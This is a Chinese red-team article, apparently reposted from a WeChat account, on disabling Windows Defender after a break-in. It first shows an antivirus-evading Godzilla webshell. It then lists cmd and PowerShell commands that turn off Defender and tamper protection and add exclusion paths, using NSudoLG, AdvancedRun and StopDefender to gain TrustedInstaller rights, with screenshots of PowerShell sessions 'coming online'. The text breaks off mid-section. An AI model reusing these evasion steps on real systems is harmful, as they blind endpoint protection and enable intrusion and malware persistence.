---
title: 红蓝对抗之致盲 Windows defender
url: https://buaq.net/go-137631.html
source: unSafe.sh - 不安全
date: 2022-11-29
fetch_date: 2025-10-03T23:57:16.473571
---

# 红蓝对抗之致盲 Windows defender

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/ee572af19e98168887085d0342819fe7.jpg)

红蓝对抗之致盲 Windows defender

Microsoft Defender 防病毒软件在 Windows 10 和 Windows 11 以及 Windows Server 版本中可用。Microsoft Defender 防病毒软件是
*2022-11-28 17:30:49
Author: [mp.weixin.qq.com(查看原文)](/jump-137631.htm)
阅读量:40
收藏*

---

Microsoft Defender 防病毒软件在 Windows 10 和 Windows 11 以及 Windows Server 版本中可用。

Microsoft Defender 防病毒软件是 Microsoft Defender for Endpoint 中下一代保护的主要组件。这种保护将机器学习、大数据分析、深入的威胁防御研究和 Microsoft 云基础设施结合在一起，以保护您组织中的设备（或端点）。Microsoft Defender 防病毒软件内置于 Windows 中，它与 Microsoft Defender for Endpoint 配合使用，为你的设备和云提供保护。

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrdaGvjLmicOibKwFZcJwEs1ibdDsWU1vCwkNlVibdwialEBLxic6UFmiaPGCZtW9cIUpbAia53iczVhTmWffg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrdaGvjLmicOibKwFZcJwEs1ibGTEYkh96uT9UQRKOnSicnR2p3qCEkccsQsZh0T3cuC2vbTFb0K85EbA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrdaGvjLmicOibKwFZcJwEs1ibRljicj8eo8hf19bMGAYEPq94dQwHnxmsVUwnuiacc1W30xUkUblc1GMQ/640?wx_fmt=png)

## **版本**

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrdaGvjLmicOibKwFZcJwEs1ib7MFbl1nO7onIyS5mBEQeR1GC0kjicDJrsF7UbYCNCIXRqOpzGC20viaA/640?wx_fmt=png)

* 用户：Administrator
* 版本：Windows Server 2019

## **补丁**

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrdaGvjLmicOibKwFZcJwEs1ibUKUD6UXwyEGqOqCEqVW8uQnoNia77TeQTyKTBn2SN32UykL9BXm6Kbg/640?wx_fmt=png)

## **systeminfo 信息**

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrdaGvjLmicOibKwFZcJwEs1ibmCCLh8ml2ia8kzTJhYr5tG5nwvEtSPgia4cM7D1uYMelRdVPcIljTA7g/640?wx_fmt=png)

在实战环境中，首先需要上传webshell，所以在此必须免杀webshell

web环境：phpstudy 8.1.1.3 + apache 2.4.39 + php 7.3.4

## **哥斯拉 webshell 免杀**

工具地址：https://github.com/BeichenDream/Godzilla

经过测试，用Godzilla自带的`PHP_XOR_BASE64`加密器即可免杀（php一句话直接杀）

### 生成 PHP\_XOR\_BASE64 webshell

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrdaGvjLmicOibKwFZcJwEs1ibS07qdpJGN7sspjOdHoZTSJAibxhllBPxDGtwvYmZjPicH2uAGdM27iccw/640?wx_fmt=png)

### 静态免杀测试

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrdaGvjLmicOibKwFZcJwEs1ib3zTw5dHicbnvEfesNzENWoNeBreyAzy3EE3lzAhuLqiaX1k8ov8GRVpw/640?wx_fmt=png)

### 连接webshell

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrdaGvjLmicOibKwFZcJwEs1iblmb0afJDyiaRxy2GbEogxGaibEzOyD0FpO0zSx2hPH0HiaTXB2y3OLs2g/640?wx_fmt=png)

### 动态免杀测试

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrdaGvjLmicOibKwFZcJwEs1ibssYTY4zeW1W7vyRt6vgTDs0VFVj3CBSoJd0hwWXtuLoIBoxVUUPtGQ/640?wx_fmt=png)

## cmd

```
#查看排除项reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions" /s#查看版本dir "C:\ProgramData\Microsoft\Windows Defender\Platform\" /od /ad /b#查看篡改保护（返回结果中的 数值5代表开启，数值4代表关闭）reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection"

#需要TrustedInstaller权限##cmd注册表关闭Windows defenderreg add "HKLM\SOFTWARE\Microsoft\Windows Defender" /v DisableAntiSpyware /t reg_dword /d 1 /f##cmd关闭篡改保护NSudoLG.exe -U:T cmd /c "reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /d 4 /t REG_DWORD /f"##cmd注册表恢复Windows defenderreg add "HKLM\SOFTWARE\Microsoft\Windows Defender" /v DisableAntiSpyware /t reg_dword /d 0 /f##cmd添加Windows defender排除项reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "c:\temp" /d 0 /t REG
```

## powershell

```
#查看排除项Get-MpPreference | select ExclusionPath
#关闭Windows defenderSet-MpPreference -DisableRealTimeMonitoring $true
#增加排除项Add-MpPreference -ExclusionPath "c:\temp"
#删除排除项Remove-MpPreference -ExclusionPath "C:\test"
#关闭实时保护Set-MpPreference -DisableRealtimeMonitoring $true
```

## **TrustedInstaller**

TrustedInstaller是从Windows Vista开始出现的一个内置安全主体，在Windows中拥有修改系统文件权限，本身是一个服务，以一个账户组的形式出现。

它的全名是：NT SERVICE\TrustedInstaller

为什么要获取TrustedInstaller权限？

说白了就是因为**Administratior权限**和**system权限**无法关闭Windows defender

注意：以下**工具**和**技巧**皆需要**Administratior权限**才能成功使用

## NSudoLG

工具地址：https://github.com/M2Team/NSudo

下载后使用：`D:\Documents\NSudo_8.2_All_Components\NSudo Launcher\x64\NSudoLG.exe`

### 免杀测试

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrdaGvjLmicOibKwFZcJwEs1ibt3yvnrULStKOaJ9rWiccFzkvMQgcdnrn8Wbc6v7hJ3pUTicsicAMkq9Vw/640?wx_fmt=png)

### 使用方法

注意：此工具的 -U:T 参数是获取了 TrustedInstaller 权限

```
#cmd注册表关闭Windows defenderreg add "HKLM\SOFTWARE\Microsoft\Windows Defender" /v DisableAntiSpyware /t reg_dword /d 1 /f#cmd注册表恢复Windows defenderreg add "HKLM\SOFTWARE\Microsoft\Windows Defender" /v DisableAntiSpyware /t reg_dword /d 0 /f#cmd添加Windows defender排除项reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "c:\temp" /d 0 /t REG_DWORD /f
#NSudoLG.exe关闭Windows defenderNSudoLG.exe -U:T cmd /c "reg add "HKLM\SOFTWARE\Microsoft\Windows Defender" /v DisableAntiSpyware /t reg_dword /d 1 /f"#NSudoLG.exe恢复Windows defenderNSudoLG.exe -U:T cmd /c "reg add "HKLM\SOFTWARE\Microsoft\Windows Defender" /v DisableAntiSpyware /t reg_dword /d 0 /f"#NSudoLG.exe添加Windows defender排除项NSudoLG.exe -U:T cmd /c "reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrdaGvjLmicOibKwFZcJwEs1ib1QVBlMItSKko8gRnmo8hlCZiaQPy7e8aruCEVhiakN9FquQM1vzmuebg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrdaGvjLmicOibKwFZcJwEs1ibMD1BXgvHanfhHSRQMibpB9qz94atvbfI7oDy8JB0ciav44SXHMUbN7pw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrdaGvjLmicOibKwFZcJwEs1ibrPL3pfdWjicBLvFgpxtDDiaWTibmo8URZZUcPK3SCzKWnBxRPkqJOeFDg/640?wx_fmt=png)

### powershell成功上线

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrdaGvjLmicOibKwFZcJwEs1ibov0JCfmOWSUTwePLGcmD9jGWnUr0c9sK4rQASHQBCGnHWBbpqQ4gvA/640?wx_fmt=png)

## AdvancedRun

地址：https://www.nirsoft.net/utils/advanced\_run.html

### 免杀测试

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrdaGvjLmicOibKwFZcJwEs1ibnJUfcP0iaQPbH4su3qzibSrDd5wdnwkZjVYecKEjAuHEZ4kcdUbCwichQ/640?wx_fmt=png)

### 使用方法

```
AdvancedRun.exe /EXEFilename "%windir%\system32\cmd.exe" /CommandLine '/c reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /d 1 /t REG_DWORD /f' /RunAs 8 /Run
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrdaGvjLmicOibKwFZcJwEs1ibENPSFRsnJrMKqyQMNkmdOowFeZUKVGWr2iblPvVR5wBMlmSSU3mFW9Q/640?wx_fmt=png)

### powershell成功上线

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrdaGvjLmicOibKwFZcJwEs1ibsxZShwOzRtAM1E0bO04MRHW8lmn7cZUSeTyLTg0eeAuH0M8rqqHiaibg/640?wx_fmt=png)

## **StopDefender**

Github地址：https://github.com/lab52io/StopDefender

### 免杀测试

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrdaGvjLmicOibKwFZcJwEs1ibicoczsVDYPsdEvh4plnaK8LI3LR5y4EsrU8GW5uiacTN3re8FpO9GfEQ/640?wx_fmt=png)

### 使用方法

```
StopDefender_x64.exe
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrdaGvjLmicOibKwFZcJwEs1ibztM07ULoCb92WibOnicyb4xPZh6IRp5CdRPWpfn5h31pMW2TLD1G638Q/640?wx_fmt=png)

### powershell成功上线

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrdaGvjLmicOibKwFZcJwEs1ib0aWDWQHd96TKYDllEmc8r4vPib4Oewe11xr2Z78JZSlf2srcAV8Y33g/640?wx_fmt=png)

## **powershell**

```
#查看排除项Get-MpPreference | select ExclusionPath
#关闭Windows defenderSet-MpPreference -DisableRealTimeMonitoring $true
#增加排除项Add-MpPreference -ExclusionPath "c:\temp"
#删除排除项Remove-MpPreference -ExclusionPath "C:\test"
```

### 关闭 Windows defender

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrdaGvjLmicOibKwFZcJwEs1ibv1SWbAcX69ABGxpmiczaiasrlZ1VpTRCqJiboC8FTn8smNV4ecWHF0cdw/640?wx_fmt=png)

### 关闭 实时保护

```
Set-MpPreference -DisableRealtimeMonitoring $true
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrdaGvjLmicOibKwFZcJwEs1ib9fdRQvWdNz3hKVylicNmI6qqqMrsFWJegTt4lr5k4WptvUqpM32Cgog/640?wx_fmt=png)

## MpCmdRun恢复被隔离的文件

### MpCmdRun介绍

配置和管理 Microsof...